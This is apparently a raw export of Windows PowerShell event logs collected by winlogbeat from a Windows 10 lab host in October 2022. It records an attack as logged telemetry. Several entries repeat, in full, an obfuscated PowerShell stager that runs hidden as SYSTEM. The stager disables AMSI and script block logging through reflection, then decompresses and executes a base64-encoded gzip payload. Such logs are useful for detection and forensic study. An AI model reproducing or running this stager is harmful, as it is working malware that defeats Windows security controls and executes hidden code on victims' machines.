Hky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=5.1.19041.1682
	RunspaceId=3a22a598-5095-4cd2-bacb-d5cf16b6174f
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=5.1.19041.1682
	RunspaceId=3a22a598-5095-4cd2-bacb-d5cf16b6174f
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6170,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:45.318","-nkLBIQByII7dpeEXg2S",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 16:52:46.208","Oct 23, 2022 @ 16:52:44.817",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

ScriptBlock ID: 69813668-cbde-4ee3-a567-89aabcfd1d95
Path: ","69813668-cbde-4ee3-a567-89aabcfd1d95","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-18","-","-","{218ecdf5-e63b-0001-6b43-8f213be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","4,828","5,976","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",5106,"Execute a Remote Command","NT AUTHORITY","S-1-5-18",SYSTEM,User,1
"Oct 23, 2022 @ 16:52:45.092",9XkLBIQByII7dpeEXg2S,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 16:52:45.518","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+